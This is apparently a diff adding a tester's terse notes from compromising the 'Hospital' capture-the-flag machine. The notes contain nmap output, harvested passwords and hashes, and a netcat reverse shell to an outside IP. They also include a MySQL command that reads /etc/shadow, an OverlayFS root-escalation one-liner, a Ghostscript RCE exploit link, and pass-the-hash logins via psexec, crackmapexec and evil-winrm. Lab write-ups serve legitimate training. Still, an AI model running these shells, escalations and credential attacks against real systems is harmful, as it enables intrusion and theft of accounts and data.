@@ -1,0 +1,292 @@
+10.10.11.241
+
+drwilliams:qwe123!@#
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+└─$ nmap -sCV -Pn -p- --open 10.10.11.241 -o hospital-nmap
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-19 09:57 +07
+Stats: 0:02:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 37.93% done; ETC: 09:59 (0:00:15 remaining)
+Stats: 0:02:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.28% done; ETC: 10:00 (0:00:00 remaining)
+Stats: 0:03:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.98% done; ETC: 10:01 (0:00:00 remaining)
+Nmap scan report for 10.10.11.241
+Host is up (0.059s latency).
+Not shown: 65506 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE           VERSION
+22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
+|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-12-19 09:59:32Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+1801/tcp  open  msmq?
+2103/tcp  open  msrpc             Microsoft Windows RPC
+2105/tcp  open  msrpc             Microsoft Windows RPC
+2107/tcp  open  msrpc             Microsoft Windows RPC
+2179/tcp  open  vmrdp?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+3269/tcp  open  globalcatLDAPssl?
+| ssl-cert: Subject: commonName=DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: HOSPITAL
+|   NetBIOS_Domain_Name: HOSPITAL
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: hospital.htb
+|   DNS_Computer_Name: DC.hospital.htb
+|   DNS_Tree_Name: hospital.htb
+|   Product_Version: 10.0.17763
+|_  System_Time: 2023-12-19T10:00:30+00:00
+| ssl-cert: Subject: commonName=DC.hospital.htb
+| Not valid before: 2023-09-05T18:39:34
+|_Not valid after:  2024-03-06T18:39:34
+5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6404/tcp  open  msrpc             Microsoft Windows RPC
+6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+6407/tcp  open  msrpc             Microsoft Windows RPC
+6409/tcp  open  msrpc             Microsoft Windows RPC
+6614/tcp  open  msrpc             Microsoft Windows RPC
+6620/tcp  open  msrpc             Microsoft Windows RPC
+8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
+|_http-server-header: Apache/2.4.55 (Ubuntu)
+| http-title: Login
+|_Requested resource was login.php
+|_http-open-proxy: Proxy might be redirecting requests
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+9389/tcp  open  mc-nmf            .NET Message Framing
+16294/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2023-12-19T10:00:29
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 217.09 seconds
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+smb 
+drwilliams:qwe123!@#
+crackmapexec smb 10.10.11.241 -u "drwilliams" -p "qwe123\!@#"
+
+
+ldap
+
+kerberos
+
+
+
+80880 - login portal
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.shoppy.htb" --hc 403,400,301 {--hl 198} -t 50 10.10.11.180
+
+http://hospital.htb:8080/uploads/revshell-php-JFIF.phar ==> uploads
+
+config.php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'root');
+define('DB_PASSWORD', 'my$qls3rv1c3!');
+define('DB_NAME', 'hospital');
+
+drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
+
+admin $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2
+patient $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO 
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.72 443 >/tmp/f
+
+mysql -u root -p 
+my$qls3rv1c3!
+
+load data infile "/etc/shadow" into table users FIELDS TERMINATED BY '\n';
+
+https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /tmp/test/bash && chmod 4755 /tmp/test/bash && /tmp/test/bash -p && rm -rf l m u w /tmp/test/bash")'
+
+
+root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
+drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19
+
+drwilliams:qwe123!@#
+
+ssh drwilliams@10.10.11.241 ==>> work but still in box
+qwe123!@#
+
+443 - login portal webmail ==> roundcube
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.hospital.htb" --hc 403,400,301 --hl 96 -t 50 https://hospital.htb:443
+drwilliams:qwe123!@#
+
+
+Please make the design in an ".eps" file format so that it can be well
+visualized with GhostScript.
+
+.eps GhostScript
+
+https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection ==>> RCE 
+
+PS C:\Users\drbrown.HOSPITAL\Documents> cat ghostscript.bat
+@echo off
+set filename=%~1
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
+
+hospital\drbrown : chr!$br0wn
+
+rdp
+xfreerdp /drive:kali,/home/kali/Desktop /u:'drbrown' /p:'chr!$br0wn' /d:hospital /w:1366 /h:768 /cert-ignore /v:10.10.11.241
+
+
+
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+evil-winrm -u 'drbrown' -p 'chr!$br0wn' -i 10.10.11.241
+
+xfreerdp /drive:kali,/home/kali/Desktop /u:'drbrown' /p:'chr!$br0wn' /d:hospital /w:1366 /h:768 /cert-ignore /v:10.10.11.241
+
+Administrator
+Th3B3stH0spt4l9786!
+
+crackmapexec smb 10.10.11.241 -u 'administrator' -p 'Th3B3stH0spt4l9786!' --local-auth --shares 
+
+evil-winrm -u 'drbrown' -p 'chr!$br0wn' -i 10.10.11.241
+
+evil-winrm -u 'drbrown' -p 'chr!$br0wn' -i 10.10.11.241
+
+crackmapexec smb 10.10.11.241 -u 'drwilliams' -p 'Th3B3stH0spt4l9786!' --shares 
+drwilliams Th3B3stH0spt4l9786!
+
+bus
+SQLp4$$
+C:\Users\drbrown.HOSPITAL\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\connect.bat
+C:\Users\drbrown.HOSPITAL\.cache\selenium\IEDriverServer\win32\4.14.0\IEDriverServer.exe
+
+
+    https://127.0.0.1/
+    http://127.0.0.1/
+    https://dc.hospital.htb/ews/Exchange.asmx
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+Name        : hMailServer
+DisplayName : hMailServer
+ImagePath   : "C:\Program Files (x86)\hMailServer\Bin\hMailServer.exe" RunAsService
+User        : LocalSystem
+StartMode   : Automatic
+
+
+*Evil-WinRM* PS C:\Program Files (x86)\hMailServer\Bin> cat hMailServer.INI
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=6b6ebe6801c8ea0ef13812caa03f4fdc
+[Database]
+Type=MSSQLCE
+Username=
+Password=82263c6e1c62d658a1b328fa4771bdac
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+
+6b6ebe6801c8ea0ef13812caa03f4fdc
+
+crackmapexec smb 10.10.11.241 -u 'administrator' --hash '6b6ebe6801c8ea0ef13812caa03f4fdc' --shares
+
+impacket-psexec -dc-ip 10.10.11.241 -hashes ":6b6ebe6801c8ea0ef13812caa03f4fdc" "hospital.htb/Administrator"@"10.10.11.241"
+
+crackmapexec winrm 10.10.11.241 -u 'administrator' -H ':6b6ebe6801c8ea0ef13812caa03f4fdc' --local-auth --continue-on-success
+
+0B50036DC0FE
+
+Get-CimInstance -ClassName win32_service | Select Name,StartMode| Where-Object {$_.Name -like 'hMailServer'}
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+1. Run the script hMailServer/Addons/Utilities/DecryptBlowfish.vbs.
+2. Enter your main hMailServer Administrator password. This is the password you specified during the installation when you first installed hMailServer. Click OK.
+3. Open up hMailserver.ini, located in your Windows directory or hMailServer bin directory.
+4. Copy the database password from hMailServer.ini to the "Enter encrypted password" dialog. In hMailServer.ini, you should see a line looking like this:
+[Database]
+...
+password=c85dae3cb73394ab
+In this example, c85dae3cb73394ab is the encrypted password.
+5. Click OK in DecryptBlowfish to view your password
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
